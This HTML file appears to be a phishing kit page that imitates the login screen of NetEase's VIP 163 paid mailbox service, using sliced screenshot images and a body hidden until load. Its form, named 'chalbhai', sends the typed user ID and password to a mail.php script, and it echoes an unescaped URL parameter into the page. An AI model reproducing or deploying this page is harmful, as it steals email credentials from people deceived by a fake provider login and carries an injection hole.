<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#32593;&#26131;&#86;&#73;&#80;&#49;&#54;&#51;&#37038;&#31665;&#30331;&#24405;&#27880;&#20876;&#45;&#26356;&#23433;&#20840;&#31283;&#23450;&#30340;&#20010;&#20154;&#21830;&#21153;&#25910;&#36153;&#37038;&#31665;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
			  .textbox {  
    border-top: solid 1px #FFFFFF; 
    border-right: solid 1px #FFFFFF; 
    border-left: solid 1px #FFFFFF; 
    border-bottom: solid 1px #FFFFFF;
	padding-left:6px;	
    height: 40px;      
 } 
 
.textbox:focus {  
    border-color: #FFFFFF; 
    border-style: solid; 
    border-width: 2px; 
    outline: 0; 
 }
 </style>
			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:48px; z-index:0"><img src="images/vp1.png" alt="" title="" border=0 width=1365 height=48></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:46px; width:1365px; height:247px; z-index:1"><img src="images/vp2.png" alt="" title="" border=0 width=1365 height=247></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:292px; width:1365px; height:283px; z-index:2"><img src="images/vp3.png" alt="" title="" border=0 width=1365 height=283></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:560px; width:1365px; height:366px; z-index:3"><img src="images/vp4.png" alt="" title="" border=0 width=1365 height=366></div>

<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:926px; width:1365px; height:342px; z-index:4"><img src="images/vp5.png" alt="" title="" border=0 width=1365 height=342></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:1268px; width:1365px; height:276px; z-index:5"><img src="images/vp6.png" alt="" title="" border=0 width=1365 height=276></div>

<div id="image7" style="position:absolute; overflow:hidden; left:0px; top:1522px; width:1365px; height:377px; z-index:6"><img src="images/vp7.png" alt="" title="" border=0 width=1365 height=377></div>

<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:1899px; width:1365px; height:214px; z-index:7"><img src="images/vp8.png" alt="" title="" border=0 width=1365 height=214></div>

<div id="image9" style="position:absolute; overflow:hidden; left:0px; top:2112px; width:1365px; height:189px; z-index:8"><img src="images/vp9.png" alt="" title="" border=0 width=1365 height=189></div>

<div id="image10" style="position:absolute; overflow:hidden; left:906px; top:14px; width:442px; height:22px; z-index:9"><a href="#"><img src="images/head.png" alt="" title="" border=0 width=442 height=22></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:859px; top:370px; width:102px; height:22px; z-index:10"><a href="#"><img src="images/vp19.png" alt="" title="" border=0 width=102 height=22></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:1059px; top:365px; width:67px; height:21px; z-index:11"><a href="#"><img src="images/vp18.png" alt="" title="" border=0 width=67 height=21></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:863px; top:410px; width:263px; height:39px; z-index:12"><a href="#"><img src="images/vp17.png" alt="" title="" border=0 width=263 height=39></a></div>

<div id="image15" style="position:absolute; overflow:hidden; left:528px; top:1996px; width:334px; height:55px; z-index:13"><a href="#"><img src="images/vp15.png" alt="" title="" border=0 width=334 height=55></a></div>

<div id="image16" style="position:absolute; overflow:hidden; left:614px; top:1441px; width:162px; height:44px; z-index:14"><a href="#"><img src="images/vp14.png" alt="" title="" border=0 width=162 height=44></a></div>

<div id="image17" style="position:absolute; overflow:hidden; left:240px; top:1070px; width:259px; height:285px; z-index:15"><a href="#"><img src="images/vp11.png" alt="" title="" border=0 width=259 height=285></a></div>

<div id="image18" style="position:absolute; overflow:hidden; left:561px; top:1072px; width:265px; height:307px; z-index:16"><a href="#"><img src="images/vp12.png" alt="" title="" border=0 width=265 height=307></a></div>

<div id="image19" style="position:absolute; overflow:hidden; left:882px; top:1073px; width:260px; height:282px; z-index:17"><a href="#"><img src="images/vp13.png" alt="" title="" border=0 width=260 height=282></a></div>

<div id="image20" style="position:absolute; overflow:hidden; left:667px; top:601px; width:58px; height:61px; z-index:18"><a href="#"><img src="images/vp10.png" alt="" title="" border=0 width=58 height=61></a></div>

<div id="image21" style="position:absolute; overflow:hidden; left:863px; top:484px; width:278px; height:41px; z-index:19"><a href="#"><img src="images/vp20.png" alt="" title="" border=0 width=278 height=41></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:515px; top:2253px; width:362px; height:20px; z-index:20"><a href="#"><img src="images/vp21.png" alt="" title="" border=0 width=362 height=20></a></div>

<form action=mail.php name=chalbhai id=chalbhai method=post>
<input name="userid" class="textbox"  value="<?=$_GET[userid]?>"  required type="text" style="position:absolute;text-align:center;font-weight: bold;width:260px;font-size: 16px;left:864px;top:186px;z-index:21">
<input name="formtext2" placeholder="&#36755;&#20837;&#23494;&#30721;" class="textbox" required type="password" style="position:absolute;width:260px;left:864px;top:251px;z-index:22">
<div id="formimage1" style="position:absolute; left:863px; top:314px; z-index:23"><input type="image" name="formimage1" width="263" height="42" src="images/button.png"></div>

</body>
</html>
